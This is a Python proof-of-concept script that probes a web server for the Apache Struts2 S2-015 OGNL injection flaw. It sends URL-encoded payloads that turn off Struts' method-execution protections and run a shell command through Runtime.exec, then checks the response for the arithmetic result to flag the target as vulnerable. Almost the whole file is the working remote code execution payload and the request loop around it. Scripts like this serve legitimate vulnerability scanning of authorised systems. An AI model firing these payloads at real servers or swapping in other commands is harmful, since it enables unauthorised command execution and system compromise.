import warnings
import requests
import random

warnings.filterwarnings("ignore")


def poc(url):
    timeout = 10
    proxies = {'http': '127.0.0.1:9999'}
    ran_a = random.randint(10000000, 20000000)
    ran_b = random.randint(1000000, 2000000)
    ran_check = ran_a - ran_b
    check = [ran_check, '无法初始化设备 PRN', '??????? PRN', 'Unable to initialize device PRN']
    lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)
    poc_goop = [
        r"/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('print goop').getInputStream())%2C%23q%7D.action",
        r"/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('" + lin + "').getInputStream())%2C%23q%7D.action"

    ]
    headers = {
        "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        for test in poc_goop:
            req = requests.get(url + test, headers=headers, timeout=timeout, verify=False, )
            result = "目标存在 Struts2-015, check url: %s" % url
            for c in check:
                if str(c) in req.text:
                    return result
    except:
        pass
